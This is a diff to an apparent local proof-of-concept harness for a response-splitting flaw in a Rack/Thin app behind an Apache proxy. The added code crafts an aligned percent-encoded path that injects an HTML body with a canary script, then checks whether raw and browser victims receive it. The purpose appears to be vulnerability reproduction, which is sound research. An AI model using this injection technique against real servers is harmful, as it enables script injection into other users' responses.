@@ -95,6 +95,18 @@ def make_attack_path() -> tuple[str, bytes]:
     raise AssertionError("could not align the Rack response tail")
 
 
+def make_html_body_path() -> tuple[str, bytes]:
+    html = b"<html><script>document.title='A_CONTROLLED_CANARY'</script></html>"
+    marker = "☃".encode() + html
+    before = 120
+    for after in range(before * 2):
+        if after == 2 * before - (1 + len(html)) - 1:
+            encoded_marker = quote_from_bytes(marker, safe=b"")
+            path = "/missing/" + "%E2%98%83" * before + encoded_marker + "%E2%98%83" * after
+            return path, marker
+    raise AssertionError("could not align the HTML body tail")
+
+
 def start_apache(httpd: Path, server_root: Path, backend_port: int,
                  port: int, root: Path, disablereuse: bool) -> subprocess.Popen[str]:
     reuse = " disablereuse=On" if disablereuse else ""
@@ -159,7 +171,7 @@ def browser_victim(browser: str, port: int) -> bytes:
 
 def one_run(args: argparse.Namespace, path: str, expected_marker: bytes,
             disablereuse: bool, browser: bool, a_delay: float,
-            b_delay: float) -> bool:
+            b_delay: float, impact: bool = False) -> bool:
     with tempfile.TemporaryDirectory(prefix="rack-thin-split-") as tmp:
         root = Path(tmp)
         thin_log = root / "thin.log"
@@ -170,7 +182,8 @@ def one_run(args: argparse.Namespace, path: str, expected_marker: bytes,
             text=True, env={**os.environ, "RACK_FILES_ROOT": str(root / "files"),
                             "RACK_THIN_A_DELAY": str(a_delay),
                             "RACK_THIN_B_DELAY": str(b_delay),
-                            "RACK_THIN_STRIP_CASCADE": "1"},
+                            "RACK_THIN_STRIP_CASCADE": "1",
+                            "RACK_THIN_IMPACT": "1" if impact else "0"},
         )
         (root / "files").mkdir()
         apache = None
@@ -246,6 +259,31 @@ def main() -> int:
     print(f"rack_thin_split_raw_positive={raw_positive} winning_pair={winning_pair}")
     print(f"rack_thin_split_browser_positive={browser_positive}")
     print("rack_thin_split_real_trigger=" + ("observed" if raw_positive else "not_observed"))
+
+    html_path, html_marker = make_html_body_path()
+    html_raw_positive = False
+    html_winning_pair: tuple[float, float] | None = None
+    for a_delay, b_delay in delay_pairs:
+        observed = one_run(args, html_path, html_marker, False, False,
+                           a_delay, b_delay, impact=True)
+        if observed and not html_raw_positive:
+            html_raw_positive = True
+            html_winning_pair = (a_delay, b_delay)
+    html_browser_positive = False
+    if html_winning_pair:
+        a_delay, b_delay = html_winning_pair
+        html_browser_positive = one_run(
+            args, html_path, html_marker, False, True, a_delay, b_delay,
+            impact=True
+        )
+        one_run(args, html_path, html_marker, True, False, a_delay, b_delay,
+                impact=True)
+        one_run(args, html_path, html_marker, True, True, a_delay, b_delay,
+                impact=True)
+    print(f"rack_thin_html_raw_positive={html_raw_positive} winning_pair={html_winning_pair}")
+    print(f"rack_thin_html_browser_positive={html_browser_positive}")
+    print("rack_thin_html_real_trigger=" +
+          ("observed" if html_raw_positive else "not_observed"))
     return 0
 
 
